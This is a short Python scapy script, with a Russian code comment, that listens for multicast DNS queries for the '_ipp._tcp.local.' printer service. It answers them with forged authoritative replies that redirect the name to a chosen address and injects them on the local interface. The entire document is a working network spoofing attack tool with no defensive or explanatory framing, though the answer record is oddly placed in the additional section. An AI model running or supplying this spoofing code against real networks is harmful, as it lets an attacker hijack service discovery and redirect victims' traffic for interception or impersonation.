from scapy.all import *
import os

# Тут нужно добавлять точку в конце
dns_to_spoof = '_ipp._tcp.local.'
redirect_to = '1.1.1.1'
interface = 'wlp2s0'

def callback(packet):

  # pkt.show()
  if (packet[DNSQR].qname.decode("utf-8") == dns_to_spoof): # DNS question record

        packet.show()
        print('----------------------------------------------')

        # Construct the DNS packet
        # Construct the Ethernet header by looking at the sniffed packet
        eth = Ether(
            src=get_if_hwaddr(interface),
            dst=packet[Ether].src
            )

        # Construct the IP header by looking at the sniffed packet
        ip = IP(
            src=get_if_addr(interface),
            dst=packet[IP].src
            )

        # Construct the UDP header by looking at the sniffed packet
        udp = UDP(
            dport=packet[UDP].sport,
            sport=packet[UDP].dport
            )

        # Construct the DNS response by looking at the sniffed packet and manually
        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            ar=DNSRR(
                rrname=packet[DNS].qd.qname,
                type='A',
                ttl=600,
                rdata=redirect_to)
            )

        # Put the full packet together
        spoofed_pkt = eth / ip / udp / dns

        print('----------------------------------------------')
        spoofed_pkt.show()
                
        sendp(spoofed_pkt, iface=interface)
        print ('Sent:', packet.summary())
        exit()

sniff(filter='udp and port 5353', iface=interface, store=0, prn=callback)
